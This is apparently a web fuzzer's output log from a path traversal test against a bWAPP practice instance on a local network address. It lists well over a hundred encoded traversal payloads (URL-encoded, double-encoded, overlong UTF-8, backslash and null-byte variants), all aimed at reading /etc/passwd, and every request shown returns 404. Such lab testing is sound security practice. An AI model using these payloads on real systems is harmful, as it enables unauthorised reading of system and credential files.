129,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
128,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af/etc/passwd
51,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
52,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
53,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
54,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
55,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
109,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd
60,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\/etc/passwd
71,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
61,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\/etc/passwd
68,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c/etc/passwd
101,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd
77,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c/etc/passwd
78,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c/etc/passwd
79,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
80,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
87,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
81,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
82,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\/etc/passwd
83,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\/etc/passwd
130,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
135,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
88,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
84,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\/etc/passwd
85,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
86,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\/etc/passwd
121,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
131,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
141,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
139,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
148,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
149,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
157,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
151,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
150,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
153,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
162,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c/etc/passwd
163,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
146,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
138,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
143,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
159,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
147,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
167,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
168,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\/etc/passwd
140,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
169,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
152,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
142,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
164,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
166,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
172,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
175,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
176,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c/etc/passwd
170,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
171,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
165,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd
144,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae//etc/passwd
160,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c/etc/passwd
145,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae//etc/passwd
180,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
173,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
189,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
188,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
183,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
187,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
185,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c/etc/passwd
190,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
195,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
194,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
184,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c/etc/passwd
206,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
196,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
205,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
202,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
203,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
200,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
197,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
199,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
178,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
177,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
192,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\/etc/passwd
201,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
207,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
198,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
191,404,9L,39W,http://192.168.1.86/bWAPP/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
204,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/etc/passwd
161,404,9L,39W,http://192.168.1.86/bWAPP/..%c1%9c..%c1%9c/etc/passwd
122,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
123,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
174,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\/etc/passwd
181,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
124,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
182,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
137,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af..%25c0%25af/etc/passwd
125,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
126,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
133,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
256,404,9L,39W,http://192.168.1.86/bWAPP/..//etc/passwd%00index.html
257,404,9L,39W,http://192.168.1.86/bWAPP/../..//etc/passwd%00index.html
258,404,9L,39W,http://192.168.1.86/bWAPP/../../..//etc/passwd%00index.html
259,404,9L,39W,http://192.168.1.86/bWAPP/../../../..//etc/passwd%00index.html
260,404,9L,39W,http://192.168.1.86/bWAPP/../../../../..//etc/passwd%00index.html
262,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../..//etc/passwd%00index.html
261,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../..//etc/passwd%00index.html
263,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../..//etc/passwd%00index.html
265,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f/etc/passwd%00index.html
266,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f/etc/passwd%00index.html
270,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
267,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f/etc/passwd%00index.html
268,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
271,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
272,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e//etc/passwd%00index.html
273,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e//etc/passwd%00index.html
275,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
278,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
276,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
277,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
127,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd
281,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
282,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
280,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f/etc/passwd%00index.html
279,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
274,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e//etc/passwd%00index.html
285,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
286,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
287,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
283,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
288,404,9L,39W,http://192.168.1.86/bWAPP/..%252f/etc/passwd%00index.html
289,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f/etc/passwd%00index.html
290,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f/etc/passwd%00index.html
132,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
296,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e//etc/passwd%00index.html
295,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
292,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
297,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e//etc/passwd%00index.html
298,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
291,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f/etc/passwd%00index.html
299,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
300,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
301,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
294,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
302,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
303,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd%00index.html
304,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f/etc/passwd%00index.html
293,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd%00index.html
305,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
179,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd
307,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
308,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
309,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
306,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
154,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
155,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
311,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
310,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd%00index.html
134,404,9L,39W,http://192.168.1.86/bWAPP/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd
269,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
315,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\/etc/passwd%00index.html
316,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\/etc/passwd%00index.html
317,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\/etc/passwd%00index.html
318,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\/etc/passwd%00index.html
314,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\/etc/passwd%00index.html
312,404,9L,39W,http://192.168.1.86/bWAPP/..\/etc/passwd%00index.html
313,404,9L,39W,http://192.168.1.86/bWAPP/..\..\/etc/passwd%00index.html
113,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%af..%c0%af/etc/passwd
34,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f/etc/passwd
319,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\/etc/passwd%00index.html
56,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
321,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c/etc/passwd%00index.html
320,404,9L,39W,http://192.168.1.86/bWAPP/..%5c/etc/passwd%00index.html
